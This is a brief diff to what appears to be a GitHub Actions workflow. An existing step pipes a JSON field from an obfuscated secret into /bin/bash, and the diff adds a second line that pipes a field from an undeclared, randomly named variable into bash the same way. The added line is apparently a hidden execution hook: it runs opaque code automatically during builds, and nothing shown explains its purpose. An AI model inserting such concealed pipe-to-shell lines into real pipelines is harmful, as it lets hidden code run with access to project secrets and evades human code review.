@@ -22,6 +22,7 @@ jobs:
           ve0: ${{ secrets.ve0 }}
         run: |
           printf '%s' "$ve0" | jq -r .kkeu550 | /bin/bash
+          printf '%s' "$epzb97736" | jq -r .z5889 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
